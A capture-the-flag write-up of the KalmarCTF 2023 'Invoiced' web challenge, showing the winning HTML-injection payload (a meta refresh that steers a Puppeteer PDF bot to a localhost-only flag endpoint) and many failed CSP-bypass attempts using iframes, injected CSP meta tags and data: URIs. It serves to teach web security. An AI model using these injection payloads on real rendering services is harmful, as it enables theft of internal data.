---
title: "KalmarCTF 2023 - Invoiced - Writeup"
date: "2023-03-05"
---

## Final working payload

Name: `a</title><meta http-equiv="Refresh" content="0; url='http://127.0.0.1:5000/orders'" />`

Others: empty 

## What we know

* Download source 
* Read files:
  * payments.js - get discount code FREEZTUFSSZ1412
  * app.js - get the implementation
    * GET /cart => show form to post to checkout 
    * POST /checkout => visit url, turn to pdf 
      * pdf impl: open puppeteer, visit /renderInvoice?name=..., wait for
        networkidle0, bake to pdf 
    * GET /renderInvoice => replace variables in template 
      * URL parameters are rendered without escaping => XSS 
    * GET /orders => return flag 
* Find unique safety features:
  * /renderInvoice has:
    * CSP  
      * default-src unsafe-inline maxcdn.bootstrapcdn
      * object-src none 
      * script-src none 
      * img-src self dummyimage.com 
  * /orders has:
    * checks remote address is 127.0.0.1
    * checks for no "Bot" cookie
    * sets X-Frame-Options to none (NO EFFECT)
    * returns flag
  * PDF bot always sets the bot cookie 
    * SameSite=Strict
    * HttpOnly


## Enumerate the possibilities

In no defined order, we tried to inject:

* script tag 
  * fails because script-src 
* meta http-equiv CSP 
  * first thought it was failing because it was rendered twice...
    used tricks like `name=...<!-- address=-->` to no avail
    wrong, it was failing because of the subtractive principle of csp
  * if CSP header and meta tag are both present, they are subtractive
* iframe `/orders`  
  * fails because frame-src 
  * got too stuck on credentialless iframe, spent way too much time
* iframe srcdoc then script 
  * fails because srcdoc inherits parent CSP 
* Reviewing bootstrap
  * Nothing interesting 
  .. and would still follow CSP 
* Considered scanning maxcdn 
  * didn't
* `<img src="/orders">`
  * works but wrong mime so broken image :) 
  * no interesting mime types that are actually plaintext, either
  * using `<picture><source src>` to set the mime type doesn't work 
    * because the flag is not an SVG
* loading it as a VTT subtitle 
  * using `<video><track>` doesn't work because CSP
    (media-src => default-src => no 'self')
* got desperate, thought we could load JS from bootstrap cdn
  * still can't, script-src hasn't changed, it's still none ...
* `<base>` tag?
  * no 
* trusted types?
  * what?
* then `@amahlaka97` flies in with 
  `a</title><meta http-equiv="Refresh" content="0; url='http://localhost:5000/orders'" />`
* have to bypass bot cookie 
  * maybe we run the meta inside a credentialless iframe?
    * no, because CSP frame-src
* `amahlaka97`: we somehow just need to get the bot cookie removed from the refresh request
  * yes
  * just change the origin
  * localhost is not 127.0.0.1
* HUH WAIT THAT COULD BE IT 
  * `a</title><meta http-equiv="Refresh" content="0; url='http://127.0.0.1:5000/orders'" />`
  * BOOM FLÄG 

kalmar{fr33_r34l_3st4t3_c91ad62}

## Learnings

* Be comprehensive
* Get an `@amahlaka97` in your team
* There are many many ways to load files
* CSP can't be relaxed, only restricted with more CSP tags
* Never forget meta refresh tag

## Ranting and rambling while solving it...


* lots of different things we tried to mess with CSP 

```
<iframe loading="eager" src="/orders" width="200" height="200" style="background:red" credentialless>NOT LOADED</iframe>
```

  - empty page (cc invoice.pdf, invoice2.pdf)

```
<iframe srcdoc="<!DOCTYPE html>"></iframe>
```

^ Works but can't run scripts  -- it inherits csp

Idea from Carlos (Hi @carlospolop)

https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp

```
<iframe src='data:text/html,<script>fetch("/orders")</script>'></iframe>
```

---

http://invoiced.chal-kalmarc.tf/renderInvoice?name=%3Ciframe%20src=%22data:text/html,HI%22%3E%3C/iframe%3E

csp default-src 'unsafe-inline' maxcdn.bootstrapcdn.com; object-src 'none'; script-src 'none'; img-src 'self' dummyimage.com

```
<iframe src="https://maxcdn.bootstrapcdn.com" sandbox="allow-scripts"></iframe>
```

---

We can write the csp tag since name is injected to head? 

```
/renderInvoice?name=</title><meta%20http-equiv="Content-Security-Policy"%20content="default-src%20*%20%27unsafe-inline%27,script-src%20%27unsafe-inline%27">&address=Fred<script>fetch("/orders").then(x=>x.text()).then((text)document.body.innerHTML+=text;</script>
```

```
http://localhost:5001/renderInvoice?name=fred%3C/title%3E%3Cmeta%20http-equiv=%22Content-Security-Policy%22%20content=%22frame-src%20*%22%3E&address=%3Ciframe%20src=%22http://localhost:5001/orders%22%20credentialless%3E%3C/iframe%3E
```

NAME: 

```
fred</title><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'; frame-src http://localhost:5001"></head><body><!--
```

ADDRESS: 

```
--><iframe src="http://localhost:5001/orders" credentialless></iframe>
```

---

```
fred</title><meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline'; script-src *; frame-src http://localhost:5001"></head><body><!--
```

----

HMM

Judging the CSP again ...

* img-src 'self'
* the only endpoint without explicit setHeader("Content-Type"...) is /orders 


---

Can't load it as CSS (default-src ! 'self')

```
http://invoiced.chal-kalmarc.tf/renderInvoice?name=fred%3C/title%3E%3Clink%20rel=%22stylesheet%22%20href=%22/orders%22%20type=%22text/css%22%3E&address=bork%3Ckalmar%3EHELLO%3C/kalmar%3E
```

---

Can't seem to load it as SVG

```
http://invoiced.chal-kalmarc.tf/renderInvoice?name=fred%3C/title%3E&address=%3Cpicture%3E%3Csource%20srcset=%22/orders%22%20type=%22image/svg%2bxml%22%20media=%22screen%22%3E%3Cimg%20src=%22https://dummyimage.com/70x70/000/fff%22%3E%3C/picture%3E&phone=hello%3Cstyle%3Ebody{background:url(/orders)}%3C/style%3E
```

--- 

Can't seem to use base href for anything useful

```
http://invoiced.chal-kalmarc.tf/renderInvoice?name=fred%3C/title%3E%3Cbase%20href=%22/orders%22%3E&address=%3Cpicture%3E%3Csource%20srcset=%22/orders%22%20type=%22image/svg%2bxml%22%20media=%22screen%22%3E%3Cimg%20src=%22https://dummyimage.com/70x70/000/fff%22%3E%3C/picture%3E&phone=hello%3Cstyle%3Ebody{background:url(/orders)}%3C/style%3E
```
